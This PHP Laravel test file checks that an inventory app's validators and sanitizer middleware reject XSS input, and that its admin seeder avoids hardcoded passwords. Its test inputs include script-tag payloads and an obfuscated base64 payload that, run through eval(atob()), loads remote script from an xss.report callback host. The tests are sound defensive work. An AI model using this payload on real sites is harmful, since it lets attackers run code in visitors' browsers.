<?php

namespace Tests\Feature;

use App\Http\Requests\StoreBorrowerRequest;
use App\Http\Requests\StoreItemRequest;
use App\Http\Requests\StoreStockMovementRequest;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Validator;
use Tests\TestCase;

class SecurityValidationTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        Schema::create('stock_movements', function (Blueprint $table) {
            $table->id();
            $table->string('reference_code')->unique();
            $table->timestamps();
        });
    }

    public function test_stock_reference_code_must_follow_bast_format(): void
    {
        $validator = Validator::make(
            ['reference_code' => 'INVALID<script>alert(1)</script>'],
            (new StoreStockMovementRequest())->rules()
        );

        $this->assertTrue($validator->fails());
        $this->assertArrayHasKey('reference_code', $validator->errors()->toArray());
    }

    public function test_item_name_rejects_xss_like_payloads(): void
    {
        $validator = Validator::make(
            ['name' => '%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E'],
            (new StoreItemRequest())->rules()
        );

        $this->assertTrue($validator->fails());
        $this->assertArrayHasKey('name', $validator->errors()->toArray());
    }

    public function test_borrower_name_rejects_xss_like_payloads(): void
    {
        $validator = Validator::make(
            ['institution_name' => '<script>alert(1)</script>'],
            (new StoreBorrowerRequest())->rules()
        );

        $this->assertTrue($validator->fails());
        $this->assertArrayHasKey('institution_name', $validator->errors()->toArray());
    }

    public function test_encoded_xss_payloads_in_names_are_rejected(): void
    {
        $payload = '%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FuYW1hbmpheXNsZWJldyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;%20onerror=evalatob(this.id)%3E211222233334324csscsccnjsnjwnjnjenjnennn';

        $itemValidator = Validator::make(
            ['name' => $payload],
            (new StoreItemRequest())->rules()
        );

        $borrowerValidator = Validator::make(
            ['institution_name' => $payload],
            (new StoreBorrowerRequest())->rules()
        );

        $this->assertTrue($itemValidator->fails());
        $this->assertArrayHasKey('name', $itemValidator->errors()->toArray());
        $this->assertTrue($borrowerValidator->fails());
        $this->assertArrayHasKey('institution_name', $borrowerValidator->errors()->toArray());
    }

    public function test_xss_sanitizer_preserves_multiline_formatting(): void
    {
        $middleware = new \App\Http\Middleware\XssSanitizer();
        $request = \Illuminate\Http\Request::create('/test', 'POST', [
            'notes' => "Baris 1\nBaris 2\r\nBaris 3",
            'description' => "Paragraf 1\n\nParagraf 2",
            'malicious' => "<script>alert(1)</script>Halo Dunia",
        ]);

        $middleware->handle($request, function ($req) {
            $this->assertEquals("Baris 1\nBaris 2\nBaris 3", $req->input('notes'));
            $this->assertEquals("Paragraf 1\n\nParagraf 2", $req->input('description'));
            $this->assertEquals("Halo Dunia", $req->input('malicious'));
            return new \Symfony\Component\HttpFoundation\Response();
        });
    }

    public function test_seeder_blocks_execution_in_production_without_env_password(): void
    {
        // Mock production environment
        app()['env'] = 'production';
        putenv('SEEDER_SUPERADMIN_PASSWORD');
        putenv('SEEDER_DEFAULT_PASSWORD');
        unset($_ENV['SEEDER_SUPERADMIN_PASSWORD'], $_ENV['SEEDER_DEFAULT_PASSWORD']);

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Keamanan Terancam');

        $seeder = new \Database\Seeders\RoleAndAdminSeeder();
        $seeder->run();
    }

    public function test_seeder_does_not_contain_hardcoded_password123(): void
    {
        $seederContent = file_get_contents(database_path('seeders/RoleAndAdminSeeder.php'));
        $this->assertStringNotContainsString('password123', $seederContent);
    }
}
